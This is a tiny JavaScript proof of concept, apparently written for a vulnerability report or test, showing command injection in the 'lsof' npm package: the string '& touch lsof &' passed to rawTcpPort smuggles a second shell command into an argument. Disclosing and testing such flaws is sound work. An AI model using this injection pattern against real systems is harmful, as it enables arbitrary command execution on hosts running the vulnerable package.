const root = require("lsof");
let attack_code = "& touch lsof &";
try {
  root.rawTcpPort(attack_code, function () {});
} catch (err) {}
